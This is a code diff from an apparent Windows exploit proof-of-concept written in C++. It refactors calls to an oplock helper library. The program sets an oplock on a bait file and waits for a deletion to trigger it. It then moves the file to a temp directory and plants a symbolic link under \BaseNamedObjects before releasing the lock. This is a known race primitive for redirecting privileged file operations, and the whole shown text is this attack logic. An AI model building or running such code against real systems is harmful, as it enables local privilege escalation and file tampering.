@@ -49,15 +49,15 @@ int wmain(int argc, wchar_t* argv[])
 		std::wcout << L"[+] Bait folder/file created." << std::endl;
 
 		std::wcout << L"[*] Setting oplock on bait file..." << std::endl;
-		auto oplock_data = owl::oplock::set_oplock(bait_file, 0, true, GENERIC_READ | DELETE, true);
+		auto oplock = owl::oplock::Oplock::set_oplock(bait_file, 0, true, GENERIC_READ | DELETE, true);
 		std::wcout << L"[+] Oplock set." << std::endl;
 
 		std::wcout << L"[*] Waiting for file deletion to trigger oplock..." << std::endl;
-		oplock_data.trigger.wait();
+		oplock.wait();
 		std::wcout << L"[+] Oplock triggered." << std::endl;
 
 		std::wcout << L"[*] Moving bait file to temp dir..." << std::endl;
-		auto new_path = owl::misc::move_to_temp_dir(oplock_data.handle.get());
+		auto new_path = owl::misc::move_to_temp_dir(oplock.get_file_handle());
 		std::wcout << std::format(L"[+] Bait file moved to {}.", new_path) << std::endl;
 
 		auto directory_object = LR"(\BaseNamedObjects)"s;
@@ -81,7 +81,7 @@ int wmain(int argc, wchar_t* argv[])
 		std::wcout << L"[+] Symlink created." << std::endl;
 
 		std::wcout << L"[*] Releasing oplock..." << std::endl;
-		oplock_data.handle.reset();
+		oplock.release();
 		std::wcout << L"[+] Oplock released. Press enter to clean up...";
 		std::cin.get();
 	}
